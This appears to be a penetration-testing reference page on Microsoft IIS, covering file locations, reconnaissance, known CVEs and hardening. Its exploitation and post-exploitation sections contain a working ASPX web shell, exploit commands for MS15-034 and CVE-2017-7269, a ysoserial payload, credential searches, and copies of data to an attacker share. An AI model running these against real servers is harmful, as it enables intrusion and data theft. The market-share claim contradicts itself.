# IIS (Internet Information Services)

!!! info "Information"
    **Category:** Web Server  
    **Tags:** 'web-server' 'iis' 'windows' 'asp.net' 'microsoft' 'http' 'https'  
    **Criticality:** 🔴 High

## Description

Internet Information Services (IIS) is Microsoft's extensible web server software for Windows Server. First released in 1995 with Windows NT, IIS has evolved through multiple versions and is currently at version 10.0, bundled with Windows Server 2016 and later, as well as Windows 10/11 client operating systems.

IIS is a comprehensive web platform that supports HTTP, HTTPS, FTP, FTPS, SMTP, and NNTP protocols. It provides a robust framework for hosting websites, web applications, and services on Windows infrastructure. IIS integrates tightly with the Windows security model, utilizing the server's user database and Access Control Lists (ACLs) for authentication and authorization.

Key features include support for ASP.NET, PHP, Node.js, and other web technologies, application pooling for isolation and reliability, advanced URL rewriting, detailed logging and monitoring, SSL/TLS encryption, and dynamic content compression. IIS powers millions of websites globally and is commonly found in enterprise environments running Microsoft-centric infrastructure.

According to W3Techs, IIS holds approximately 6-8% of the web server market share and is the second most popular web server after Nginx and Apache. It's particularly prevalent in corporate environments, government agencies, and organizations using Microsoft 365, SharePoint, Exchange, and other Microsoft enterprise products.

**Current versions:**
- IIS 10.0 (Windows Server 2016, 2019, 2022, Windows 10/11)
- IIS 8.5 (Windows Server 2012 R2, Windows 8.1)
- IIS 8.0 (Windows Server 2012, Windows 8)
- IIS 7.5 (Windows Server 2008 R2, Windows 7)
- IIS 7.0 (Windows Server 2008, Windows Vista)
- Legacy: IIS 6.0 and earlier (deprecated, unsupported)

---

## Configuration Files

=== "IIS 7.0 and later (Current)"
    ```powershell
    # Main global configuration
    %SystemRoot%\System32\inetsrv\config\applicationHost.config
    
    # IIS management configuration
    %SystemRoot%\System32\inetsrv\config\administration.config
    
    # Centralized configuration redirection
    %SystemRoot%\System32\inetsrv\config\redirection.config
    
    # Configuration schema files
    %SystemRoot%\System32\inetsrv\config\schema\
    %SystemRoot%\System32\inetsrv\config\schema\IIS_Schema.xml
    %SystemRoot%\System32\inetsrv\config\schema\ASPNET_Schema.xml
    %SystemRoot%\System32\inetsrv\config\schema\FX_Schema.xml
    
    # Application-level configurations
    [WebRoot]\web.config
    [ApplicationPath]\web.config
    
    # .NET Framework configuration
    %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
    %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\Config\web.config
    ```

=== "IIS 6.0 and earlier (Legacy)"
    ```powershell
    # MetaBase (IIS 6.0 and earlier)
    %SystemRoot%\System32\inetsrv\MetaBase.xml
    
    # MetaBase schema
    %SystemRoot%\System32\inetsrv\MBSchema.xml
    ```

=== "IIS Express"
    ```powershell
    # Command-line IIS Express
    C:\Users\[User]\Documents\IISExpress\config\applicationhost.config
    
    # Visual Studio IIS Express
    [SolutionFolder]\.vs\[ProjectName]\config\applicationhost.config
    ```

---

## Log Files

```powershell
# Default log location (W3C format)
%SystemDrive%\inetpub\logs\LogFiles\

# Site-specific logs (by Site ID)
%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\
%SystemDrive%\inetpub\logs\LogFiles\W3SVC2\
# Pattern: W3SVC[SiteID]\

# HTTP.SYS error logs (kernel-level errors)
%SystemRoot%\System32\LogFiles\HTTPERR\

# Failed Request Tracing logs
%SystemDrive%\inetpub\logs\FailedReqLogFiles\

# FTP logs
%SystemDrive%\inetpub\logs\LogFiles\FTPSVC1\
%SystemDrive%\inetpub\logs\LogFiles\FTPSVC2\

# SMTP logs
%SystemDrive%\inetpub\logs\LogFiles\SMTPSVC1\

# Application pool identity logs
%SystemDrive%\Windows\System32\LogFiles\

# ASP.NET trace logs
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\

# Windows Event Logs
Application Event Log (ASP.NET errors, IIS application errors)
System Event Log (IIS service events)
```

---

## Sensitive Files

!!! danger "Credentials and sensitive data"
    The following files may contain critical information:
    
    - `applicationHost.config` - Contains application pool identities, connection strings, SSL certificates
    - `web.config` - Application-specific settings including database connection strings, authentication settings
    - `machine.config` - Global .NET configuration with potential credentials
    - `*.pfx / *.p12` - SSL certificate files with private keys
    - `*.key / *.pem` - SSL/TLS private keys
    - `*.cer / *.crt` - SSL certificates
    - `.htpasswd` - HTTP Basic Authentication credentials (if using Apache-style auth)
    - `connectionStrings.config` - Externalized connection strings
    - `appSettings.config` - Application settings that may contain API keys
    - `Global.asax` - Application-level code that may contain credentials
    - `*.aspx.cs / *.aspx.vb` - Code-behind files with potential hardcoded credentials
    - `*.dll` - Compiled assemblies that may contain secrets
    - `App_Data\` - Application data directory often containing databases
    - `*.mdf / *.ldf` - SQL Server database files in App_Data
    - `*.sdf` - SQL Server Compact databases
    - `*.config.backup` - Configuration backups with credentials

!!! warning "Backup and temporary files"
    Don't forget to check for backups and editor temp files:
    
    - `web.config~`
    - `web.config.bak`
    - `web.config.old`
    - `web.config.backup`
    - `web.config.save`
    - `applicationHost.config.bak`
    - `*.config.swp` (vim swap files)
    - `.vs\` (Visual Studio settings)
    - `bin\*.pdb` (Debug symbols with source information)
    - `obj\` (Compilation artifacts)

---

## Data Directories

```powershell
# Default web root
%SystemDrive%\inetpub\wwwroot\

# Application pool configuration
%SystemRoot%\System32\inetsrv\config\applicationPools\

# IIS installation directory
%SystemRoot%\System32\inetsrv\

# IIS modules
%SystemRoot%\System32\inetsrv\
%SystemRoot%\System32\inetsrv\config\

# Temporary ASP.NET files
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\

# FTP root
%SystemDrive%\inetpub\ftproot\

# SMTP drop folders
%SystemDrive%\inetpub\mailroot\

# Cache and temporary files
%SystemDrive%\Windows\Temp\
%SystemDrive%\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\

# Application data
%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\
```

---

## Pentest Tips

!!! tip "Reconnaissance"
    **Version identification:**
    ```bash
    # Banner grabbing with curl
    curl -I http://target.com
    # Look for: Server: Microsoft-IIS/10.0
    
    # Banner grabbing with nc
    echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
    
    # Nmap service detection
    nmap -p 80,443 -sV target.com
    nmap -p 80,443 --script http-headers target.com
    
    # Detailed IIS fingerprinting
    nmap -p 80,443 --script http-iis-short-name-brute target.com
    
    # Check for internal IP disclosure (HTTP/1.0 downgrade)
    curl -v --http1.0 http://target.com
    # May reveal internal IPs in Location headers
    
    # OpenSSL for HTTPS fingerprinting
    openssl s_client -connect target.com:443 -showcerts
    ```
    
    **Default ports:**
    - HTTP: 80
    - HTTPS: 443
    - FTP: 21
    - FTPS: 990
    - SMTP: 25
    - Alternative ports: 8080, 8443
    
    **IIS-specific headers to look for:**
    ```
    Server: Microsoft-IIS/10.0
    X-Powered-By: ASP.NET
    X-AspNet-Version: 4.0.30319
    X-AspNetMvc-Version: 5.2
    X-FEServer: [Exchange Server name]
    ```
    
    **Shodan queries:**
    ```
    http.title:"IIS"
    Server: Microsoft-IIS
    "Microsoft-IIS/10.0"
    http.component:"Microsoft IIS"
    ssl.cert.issuer.cn:"example.com" http.title:"IIS"
    ```

!!! tip "Enumeration"
    **IIS Tilde (~) Directory Enumeration:**
    
    IIS on Windows generates 8.3 short filenames for compatibility. This can be exploited to discover hidden files and directories.
    
    ```bash
    # Manual testing
    curl http://target.com/*~1*/.aspx
    # Look for 404 vs other responses
    
    # Automated scanning with shortscan
    shortscan http://target.com/
    shortscan http://target.com/admin/
    
    # Using IIS-ShortName-Scanner
    java -jar iis_shortname_scanner.jar http://target.com
    
    # Nuclei template
    nuclei -u http://target.com -t http/fuzzing/iis-shortname.yaml
    
    # Common patterns to test
    http://target.com/ADMINI~1/
    http://target.com/BACKUP~1/
    http://target.com/CONFIG~1/
    ```
    
    **Common misconfigurations:**
    
    - Server version disclosure in headers
    - Directory browsing enabled
    - Exposed configuration files (web.config, applicationHost.config)
    - Backup files in web root
    - Debug mode enabled (compilation debug="true")
    - Detailed error messages exposing stack traces
    - Default error pages revealing server information
    - WebDAV enabled unnecessarily
    - Insecure HTTP methods allowed (PUT, DELETE, TRACE)
    - Weak SSL/TLS configurations
    
    **Directory and file brute-forcing:**
    ```bash
    # Gobuster with IIS-specific wordlist
    gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt \
             -x aspx,asp,config,bak
    
    # Feroxbuster for IIS
    feroxbuster -u http://target.com -w wordlist.txt \
                -x aspx,asp,ashx,asmx,config -C 404,403
    
    # ffuf with ASP.NET extensions
    ffuf -u http://target.com/FUZZ -w wordlist.txt \
         -e .aspx,.asp,.ashx,.asmx,.config,.cs,.vb
    
    # Dirsearch for IIS
    dirsearch -u http://target.com -e aspx,asp,ashx,asmx,config
    ```
    
    **Common files and directories to check:**
    ```bash
    # Configuration files
    /web.config
    /Web.config
    /WEB.CONFIG
    /web.config.bak
    /web.config~
    /applicationHost.config
    
    # Default pages
    /default.aspx
    /Default.aspx
    /index.aspx
    /iisstart.htm
    
    # Application files
    /Global.asax
    /global.asa
    /bin/
    /App_Data/
    /App_Code/
    /App_Browsers/
    /App_GlobalResources/
    /App_LocalResources/
    /App_Themes/
    
    # Common admin areas
    /admin/
    /administrator/
    /manage/
    /webadmin/
    /siteadmin/
    /controlpanel/
    
    # API endpoints
    /api/
    /webservices/
    /service.asmx
    /wcf/
    
    # Information disclosure
    /trace.axd (ASP.NET trace viewer)
    /elmah.axd (Error logging)
    /glimpse.axd (Debugging tool)
    /hangfire (Background job processing)
    ```
    
    **WebDAV enumeration:**
    ```bash
    # Check if WebDAV is enabled
    curl -X OPTIONS http://target.com
    # Look for: DAV: 1,2 in response headers
    
    # Nmap WebDAV detection
    nmap -p 80 --script http-webdav-scan target.com
    
    # davtest for WebDAV testing
    davtest -url http://target.com
    
    # cadaver for interactive WebDAV
    cadaver http://target.com
    ```
    
    **Check for exposed debug/trace features:**
    ```bash
    # ASP.NET trace viewer (if enabled)
    curl http://target.com/trace.axd
    
    # Check for debug mode
    # Look in web.config or responses for:
    # <compilation debug="true">
    
    # Test for detailed errors
    curl http://target.com/nonexistent.aspx
    # Detailed errors may reveal paths, versions, stack traces
    ```

!!! tip "Exploitation"
    **Path traversal via WebDAV authentication bypass (CVE-2009-1535, CVE-2009-1122):**
    ```bash
    # WebDAV Unicode bypass (IIS 5.0/6.0)
    GET /protected/file.txt HTTP/1.1
    # Blocked by authentication
    
    # Bypass with Unicode encoding
    GET /protected%c0%affile.txt HTTP/1.1
    GET /protected\xc1\x9cfile.txt HTTP/1.1
    ```
    
    **IIS 6.0 WebDAV buffer overflow (CVE-2017-7269):**
    ```bash
    # Metasploit module
    use exploit/windows/iis/iis_webdav_scstoragepathfromurl
    set RHOST target.com
    set RPORT 80
    exploit
    
    # Manual exploitation (PROPFIND request with long If header)
    # This is a critical RCE vulnerability
    ```
    
    **HTTP.SYS remote code execution (CVE-2015-1635, MS15-034):**
    ```bash
    # Range header overflow
    curl -H "Range: bytes=0-18446744073709551615" http://target.com/
    
    # Nmap detection
    nmap -p 80 --script http-vuln-cve2015-1635 target.com
    
    # Metasploit module
    use auxiliary/dos/http/ms15_034_ulonglongadd
    ```
    
    **IIS shortname disclosure to file upload:**
    ```bash
    # 1. Use shortname enumeration to find upload directory
    shortscan http://target.com/
    # Discovers: UPLOAD~1 -> uploads/
    
    # 2. Upload malicious ASPX shell
    curl -X PUT http://target.com/uploads/shell.aspx --data-binary @shell.aspx
    
    # 3. Access the shell
    curl http://target.com/uploads/shell.aspx
    ```
    
    **ASP.NET ViewState deserialization (if MAC validation disabled):**
    ```bash
    # Check for disabled ViewState MAC
    # In web.config: enableViewStateMac="false"
    
    # ysoserial.net for payload generation
    ysoserial.exe -o base64 -g TypeConfuseDelegate \
                  -f ObjectStateFormatter \
                  -c "cmd.exe /c whoami"
    ```
    
    **Exploiting unrestricted file upload:**
    ```bash
    # If .aspx uploads are allowed
    # Create simple web shell
    echo '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Response.Write("<pre>");Process p = new Process();p.StartInfo.FileName = "cmd.exe";p.StartInfo.Arguments = "/c " + Request["cmd"];p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());Response.Write("</pre>");%>' > shell.aspx
    
    # Upload and access
    curl http://target.com/uploads/shell.aspx?cmd=whoami
    ```
    
    **IIS reverse proxy path traversal:**
    ```bash
    # If IIS acts as reverse proxy
    # Backend: http://internal-server/admin/
    # Frontend: http://target.com/api/
    
    # Attempt traversal
    GET /api../admin/ HTTP/1.1
    GET /api/../admin/ HTTP/1.1
    GET /api/..%2fadmin/ HTTP/1.1
    ```

!!! tip "Post-Exploitation"
    **Where to find credentials:**
    
    - `web.config` - Connection strings, app settings
    - `applicationHost.config` - Application pool identities
    - `machine.config` - Global .NET settings
    - `*.pfx` / `*.p12` files - SSL certificates (can be cracked)
    - `App_Data\` - Local database files
    - Windows Credential Manager (cmdkey /list)
    - IIS application pool identities in memory
    - ASP.NET machine key for ViewState decryption
    
    **Extract credentials from configuration:**
    ```powershell
    # Search for connection strings
    Select-String -Path "C:\inetpub\wwwroot\*.config" -Pattern "connectionString" -Recurse
    
    # Search for passwords
    Select-String -Path "C:\inetpub\wwwroot\*" -Pattern "password" -Recurse
    
    # Decrypt encrypted sections (if you have permissions)
    aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\myapp"
    
    # Export IIS configuration
    %systemroot%\system32\inetsrv\appcmd.exe list config /text
    
    # List application pools and identities
    %systemroot%\system32\inetsrv\appcmd.exe list apppool /text
    ```
    
    **Persistence mechanisms:**
    
    - Deploy ASP.NET web shell in hidden directory
    - Register malicious IIS module (DLL backdoor)
    - Modify Global.asax for application-level persistence
    - Add scheduled task via ASP.NET code execution
    - Create new application pool with elevated identity
    - Modify applicationHost.config to load malicious module
    - Plant backdoor in App_Code (automatically compiled)
    
    **IIS module persistence (advanced):**
    ```powershell
    # Malicious IIS modules survive patches and reboots
    # Common in APT campaigns (e.g., SharePoint exploits)
    
    # List loaded modules
    %systemroot%\system32\inetsrv\appcmd.exe list module
    
    # Check for suspicious DLLs in
    %SystemRoot%\System32\inetsrv\
    
    # Monitor Event ID 29 and 50 for module loading
    Get-WinEvent -FilterHashtable @{LogName='System';ID=29,50}
    ```
    
    **Lateral movement:**
    
    - Extract AD credentials from IIS application pools
    - Access backend databases with connection string credentials
    - Pivot to internal network from DMZ web server
    - Access file shares mapped in web applications
    - Compromise linked Exchange/SharePoint servers
    
    **Data exfiltration:**
    ```powershell
    # Access App_Data databases
    copy "C:\inetpub\wwwroot\App_Data\database.mdf" \\attacker\share\
    
    # Dump IIS logs for reconnaissance
    copy "C:\inetpub\logs\LogFiles\W3SVC1\*" \\attacker\share\
    
    # Extract SSL certificates and keys
    # Use Mimikatz or export from certificate store
    ```

---

## Useful Commands

```powershell
# Check if IIS is installed and running
Get-Service -Name W3SVC
Get-WindowsFeature -Name Web-Server

# IIS Manager GUI
inetmgr

# List all sites
%systemroot%\system32\inetsrv\appcmd.exe list site

# List application pools
%systemroot%\system32\inetsrv\appcmd.exe list apppool

# List all configurations
%systemroot%\system32\inetsrv\appcmd.exe list config

# Show full configuration in XML
%systemroot%\system32\inetsrv\appcmd.exe list config /text

# Get specific site configuration
%systemroot%\system32\inetsrv\appcmd.exe list site "Default Web Site" /config /xml

# Start/Stop/Restart IIS
iisreset /start
iisreset /stop
iisreset /restart

# Stop specific site
%systemroot%\system32\inetsrv\appcmd.exe stop site "Default Web Site"

# Start specific site
%systemroot%\system32\inetsrv\appcmd.exe start site "Default Web Site"

# Recycle application pool
%systemroot%\system32\inetsrv\appcmd.exe recycle apppool "DefaultAppPool"

# Backup IIS configuration
%systemroot%\system32\inetsrv\appcmd.exe add backup "BackupName"

# Restore IIS configuration
%systemroot%\system32\inetsrv\appcmd.exe restore backup "BackupName"

# List all backups
%systemroot%\system32\inetsrv\appcmd.exe list backup

# Find configuration files
dir /s /b C:\Windows\System32\inetsrv\config\*.config
dir /s /b C:\inetpub\*.config

# Search for passwords in configs
findstr /si "password" C:\inetpub\wwwroot\*.config
findstr /si "connectionString" C:\inetpub\wwwroot\*.config

# PowerShell: Search for credentials
Get-ChildItem -Path C:\inetpub\ -Recurse -Include *.config | Select-String -Pattern "password|connectionString"

# View IIS logs
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log | Select-Object -Last 100

# Monitor IIS logs in real-time (PowerShell)
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log -Wait -Tail 50

# Check IIS version
reg query "HKLM\SOFTWARE\Microsoft\InetStp" /v VersionString

# List installed IIS modules
%systemroot%\system32\inetsrv\appcmd.exe list module

# Export site configuration
%systemroot%\system32\inetsrv\appcmd.exe list site "Default Web Site" /config /xml > site_config.xml

# Check application pool identity
%systemroot%\system32\inetsrv\appcmd.exe list apppool "DefaultAppPool" /text:processModel.identityType

# List virtual directories
%systemroot%\system32\inetsrv\appcmd.exe list vdir

# Check bindings
%systemroot%\system32\inetsrv\appcmd.exe list site /text:bindings

# View failed request tracing logs
notepad C:\inetpub\logs\FailedReqLogFiles\W3SVC1\*.xml

# PowerShell: Get IIS site information
Import-Module WebAdministration
Get-Website
Get-IISSite
Get-WebBinding
```

---

## Known Vulnerabilities

??? danger "CVE-2025-59282 - IIS Remote Code Execution via COM Objects Race Condition"
    Remote code execution vulnerability in IIS Inbox COM Objects due to race condition and use-after-free in global memory handling.
    
    **Affected versions:** IIS on Windows Server 2016, 2019, 2022, Windows 10/11  
    **Severity:** Important (CVSS 7.0)  
    **Fixed in:** October 2025 security update  
    **Attack vector:** Local (requires user interaction with malicious file)
    **Impact:** Arbitrary code execution with elevated privileges
    
    **Technical details:**
    - Race condition (CWE-362) in concurrent thread execution
    - Use-after-free (CWE-416) vulnerability in shared memory
    - Requires winning timing race for exploitation
    - High complexity, user interaction required

??? danger "CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706 - SharePoint RCE with IIS Module Persistence"
    Critical SharePoint vulnerabilities being actively exploited with IIS module persistence for long-term access.
    
    **Affected versions:** SharePoint Server 2019, 2016, 2013  
    **Severity:** Critical (CVSS 9.8)  
    **First seen:** July 2025  
    **Impact:** Remote code execution, persistent access via malicious IIS modules
    
    **Attack chain:**
    1. Exploit SharePoint vulnerability for unauthenticated RCE
    2. Deploy spinstall0.aspx webshell for immediate control
    3. Steal machine keys and gather credentials
    4. Install malicious IIS modules (DLL backdoors) for persistence
    5. Modules survive patches, reboots, and traditional security scans
    
    **Detection:**
    - Monitor Event IDs 29 and 50 for module loading
    - Check for unusual w3wp.exe process behavior
    - Review IIS module list for unauthorized DLLs
    - Monitor for webshell patterns (spinstall0.aspx)

??? danger "CVE-2023-38180 - HTTP/2 Rapid Reset DoS"
    Denial of Service vulnerability in HTTP/2 implementation allowing resource exhaustion.
    
    **Affected versions:** IIS 10.0 on Windows Server 2016+  
    **Severity:** High (CVSS 7.5)  
    **Fixed in:** October 2023 security update  
    **Impact:** Service disruption via rapid stream creation and cancellation
    
    **Exploitation:**
    ```bash
    # Rapid RST_STREAM attack
    # Creates and cancels HTTP/2 streams rapidly
    # Exhausts server resources
    ```

??? danger "CVE-2023-28796, CVE-2023-28799, CVE-2023-28800 - Multiple HTTP.sys DoS Vulnerabilities"
    Multiple denial of service vulnerabilities in HTTP.sys driver.
    
    **Affected versions:** Windows Server 2022, 2019, 2016, Windows 10/11  
    **Severity:** Medium  
    **Fixed in:** July 2023 security update  
    **Impact:** System crash or unresponsiveness

??? danger "CVE-2022-21907 - HTTP.sys Remote Code Execution"
    Remote code execution vulnerability in HTTP Protocol Stack (HTTP.sys).
    
    **Affected versions:** Windows Server 2019, 2022, Windows 10, 11  
    **Severity:** Critical (CVSS 9.8)  
    **Fixed in:** January 2022 security update  
    **Impact:** Remote code execution, denial of service
    
    **Exploitation:**
    ```bash
    # Specially crafted HTTP trailer headers can trigger RCE
    # Wormable - can spread without user interaction
    # Active exploitation in the wild
    ```

??? danger "CVE-2020-0645 - IIS Server Tampering Vulnerability"
    Tampering vulnerability in IIS when handling malformed request headers.
    
    **Affected versions:** IIS on Windows Server 2012-2019, Windows 10  
    **Severity:** Medium  
    **Fixed in:** February 2020 security update  
    **Impact:** Request smuggling, cache poisoning

??? danger "CVE-2019-18935 - Telerik UI RCE via .NET Deserialization"
    .NET deserialization vulnerability in Progress Telerik UI for ASP.NET AJAX.
    
    **Affected versions:** Telerik UI builds before R1 2020 (2020.1.114)  
    **Severity:** Critical (CVSS 9.8)  
    **Impact:** Remote code execution on IIS servers hosting Telerik
    
    **Exploitation:**
    - Requires knowledge of Telerik encryption keys
    - Often combined with CVE-2017-11357 or CVE-2017-11317 for key theft
    - Upload malicious DLL files to C:\Windows\Temp\
    - File naming: [UnixEpochTime].[Fraction].dll
    - Actively exploited by APT groups against US government IIS servers
    
    **Indicators:**
    ```bash
    # Check for malicious DLLs in Temp
    dir C:\Windows\Temp\*.dll
    # Look for files with Unix timestamp naming pattern
    # Example: 1667206973.2270932.dll
    ```

??? danger "CVE-2017-7269 - IIS 6.0 WebDAV Buffer Overflow"
    Buffer overflow in WebDAV service allowing remote code execution.
    
    **Affected versions:** IIS 6.0 on Windows Server 2003 R2  
    **Severity:** Critical (CVSS 9.8)  
    **Impact:** Remote code execution
    
    **Exploitation:**
    ```bash
    # Metasploit module
    use exploit/windows/iis/iis_webdav_scstoragepathfromurl
    set RHOST target.com
    set RPORT 80
    exploit
    
    # Exploits ScStoragePathFromUrl function
    # Send PROPFIND request with long "If:" header
    # Header starts with "If: <http://"
    # Widely exploited in the wild in 2016-2017
    ```

??? danger "CVE-2015-1635 - HTTP.sys Remote Code Execution (MS15-034)"
    Critical remote code execution vulnerability in HTTP.sys.
    
    **Affected versions:** Windows 7-10, Server 2008 R2-2012 R2  
    **Severity:** Critical (CVSS 9.8)  
    **Fixed in:** April 2015  
    **Impact:** Remote code execution or denial of service
    
    **Exploitation:**
    ```bash
    # Integer overflow in Range header processing
    curl -H "Range: bytes=0-18446744073709551615" http://target.com/
    
    # Can be used for DoS or RCE
    # Caused significant impact when disclosed
    ```

??? danger "CVE-2010-2730 - IIS FTP Service Heap Buffer Overflow"
    Heap buffer overflow in FTP service 7.0 and 7.5 for IIS.
    
    **Affected versions:** IIS 7.0, 7.5  
    **Severity:** Critical  
    **Fixed in:** September 2010 (MS10-065)  
    **Impact:** Remote code execution, denial of service
    
    **Exploitation:**
    ```bash
    # Crafted FTP command triggers heap overflow
    # Allows arbitrary code execution
    # Affects ftpsvc.dll TELNET_STREAM_CONTEXT::OnSendData
    ```

??? danger "CVE-2010-2731 - IIS FastCGI Request Header Buffer Overflow"
    Buffer overflow when FastCGI is enabled.
    
    **Affected versions:** IIS 7.5  
    **Severity:** Critical  
    **Fixed in:** September 2010  
    **Impact:** Remote code execution via crafted headers

??? danger "CVE-2009-1535, CVE-2009-1122 - WebDAV Authentication Bypass"
    WebDAV authentication bypass via Unicode character encoding.
    
    **Affected versions:** IIS 5.0, 5.1, 6.0  
    **Severity:** High  
    **Impact:** Unauthorized access to protected resources
    
    **Exploitation:**
    ```bash
    # Unicode bypass technique
    # Replace "/" with Unicode equivalent
    GET /protected%c0%affile.txt HTTP/1.1
    
    # Bypasses URI-based authentication
    ```

---

## Hardening

!!! success "Best practices"
    **1. Remove unnecessary features and modules:**
    ```powershell
    # Uninstall unused IIS features
    Remove-WindowsFeature -Name Web-WebDAV
    Remove-WindowsFeature -Name Web-Ftp-Server
    
    # Remove default IIS sample files
    Remove-Item C:\inetpub\wwwroot\iisstart.htm
    Remove-Item C:\inetpub\wwwroot\iisstart.png
    
    # Disable unnecessary HTTP modules
    %systemroot%\system32\inetsrv\appcmd.exe set config /section:modules /-[name='WebDAVModule']
    ```
    
    **2. Hide server version and headers:**
    ```powershell
    # Remove Server header (IIS 10+)
    Set-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST' -Filter "system.webServer/security/requestFiltering" -Name "removeServerHeader" -Value "True"
    
    # Alternative via registry (all versions)
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\HTTP\Parameters" /v DisableServerHeader /t REG_DWORD /d 1 /f
    
    # Remove X-Powered-By header in applicationHost.config
    # <httpProtocol>
    #   <customHeaders>
    #     <remove name="X-Powered-By" />
    #   </customHeaders>
    # </httpProtocol>
    
    # Or via command line
    %systemroot%\system32\inetsrv\appcmd.exe set config /section:httpProtocol /-customHeaders.[name='X-Powered-By']
    
    # Remove X-AspNet-Version in web.config
    # <system.web>
    #   <httpRuntime enableVersionHeader="false" />
    # </system.web>
    ```
    
    **3. Disable directory browsing:**
    ```powershell
    # Globally disable directory browsing
    %systemroot%\system32\inetsrv\appcmd.exe set config /section:directoryBrowse /enabled:false
    
    # Or in web.config
    # <system.webServer>
    #   <directoryBrowse enabled="false" />
    # </system.webServer>
    ```
    
    **4. Configure strong SSL/TLS:**
    ```powershell
    # Use IIS Crypto tool (recommended) or manual registry changes
    # Download from: https://www.nartac.com/Products/IISCrypto
    
    # Disable weak protocols (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1)
    # Enable only TLS 1.2 and TLS 1.3
    
    # Disable weak ciphers
    # Enable only strong cipher suites:
    # - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    # - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    # - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    # - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    
    # Enforce HSTS (in web.config or applicationHost.config)
    # <httpProtocol>
    #   <customHeaders>
    #     <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains; preload" />
    #   </customHeaders>
    # </httpProtocol>
    ```
    
    **5. Add security headers:**
    
    Add to web.config or applicationHost.config:
    ```xml
    <httpProtocol>
      <customHeaders>
        <!-- Remove default headers -->
        <remove name="X-Powered-By" />
        
        <!-- Add security headers -->
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-XSS-Protection" value="1; mode=block" />
        <add name="Referrer-Policy" value="strict-origin-when-cross-origin" />
        <add name="Permissions-Policy" value="geolocation=(), microphone=(), camera=()" />
        <add name="Content-Security-Policy" value="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';" />
        <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains; preload" />
      </customHeaders>
    </httpProtocol>
    ```
    
    **6. Disable insecure HTTP methods:**
    ```xml
    <!-- In web.config -->
    <system.webServer>
      <security>
        <requestFiltering>
          <verbs allowUnlisted="false">
            <add verb="GET" allowed="true" />
            <add verb="POST" allowed="true" />
            <add verb="HEAD" allowed="true" />
          </verbs>
        </requestFiltering>
      </security>
    </system.webServer>
    ```
    
    **7. Configure application pool isolation:**
    ```powershell
    # Each application should have its own pool
    %systemroot%\system32\inetsrv\appcmd.exe add apppool /name:"MyAppPool"
    
    # Use least privilege identity
    %systemroot%\system32\inetsrv\appcmd.exe set apppool "MyAppPool" /processModel.identityType:ApplicationPoolIdentity
    
    # Enable 32-bit applications only if needed
    %systemroot%\system32\inetsrv\appcmd.exe set apppool "MyAppPool" /enable32BitAppOnWin64:false
    ```
    
    **8. Implement request filtering:**
    ```xml
    <system.webServer>
      <security>
        <requestFiltering>
          <!-- Set max content length (in bytes) -->
          <requestLimits maxAllowedContentLength="10485760" maxUrl="4096" maxQueryString="2048" />
          
          <!-- Deny access to sensitive files -->
          <fileExtensions allowUnlisted="true">
            <add fileExtension=".config" allowed="false" />
            <add fileExtension=".cs" allowed="false" />
            <add fileExtension=".vb" allowed="false" />
            <add fileExtension=".bak" allowed="false" />
            <add fileExtension=".old" allowed="false" />
          </fileExtensions>
          
          <!-- Deny dangerous character sequences -->
          <denyUrlSequences>
            <add sequence=".." />
            <add sequence="~/" />
          </denyUrlSequences>
        </requestFiltering>
      </security>
    </system.webServer>
    ```
    
    **9. Disable detailed error messages:**
    ```xml
    <!-- In web.config -->
    <system.web>
      <customErrors mode="On" defaultRedirect="~/Error.aspx">
        <error statusCode="404" redirect="~/NotFound.aspx" />
        <error statusCode="500" redirect="~/ServerError.aspx" />
      </customErrors>
      <compilation debug="false" />
    </system.web>
    
    <system.webServer>
      <httpErrors errorMode="Custom" existingResponse="Replace">
        <remove statusCode="404" />
        <error statusCode="404" path="/NotFound.html" responseMode="File" />
        <remove statusCode="500" />
        <error statusCode="500" path="/ServerError.html" responseMode="File" />
      </httpErrors>
    </system.webServer>
    ```
    
    **10. Secure web.config and sensitive files:**
    ```powershell
    # Deny web access to web.config
    # (Already done by default in IIS)
    
    # Encrypt sensitive sections
    aspnet_regiis.exe -pef "connectionStrings" "C:\inetpub\wwwroot\myapp"
    aspnet_regiis.exe -pef "appSettings" "C:\inetpub\wwwroot\myapp"
    
    # Set proper NTFS permissions
    icacls "C:\inetpub\wwwroot" /inheritance:r
    icacls "C:\inetpub\wwwroot" /grant "IIS_IUSRS:(OI)(CI)R"
    icacls "C:\inetpub\wwwroot" /grant "Administrators:(OI)(CI)F"
    
    # Restrict App_Data directory
    icacls "C:\inetpub\wwwroot\App_Data" /inheritance:r
    icacls "C:\inetpub\wwwroot\App_Data" /grant "IIS_IUSRS:(OI)(CI)M"
    ```
    
    **11. Move log files to non-system drive:**
    ```powershell
    # Move to D:\Logs (recommended by CIS)
    %systemroot%\system32\inetsrv\appcmd.exe set config -section:sites -siteDefaults.logfile.directory:"D:\Logs"
    
    # Protect log directory
    icacls "D:\Logs" /inheritance:r
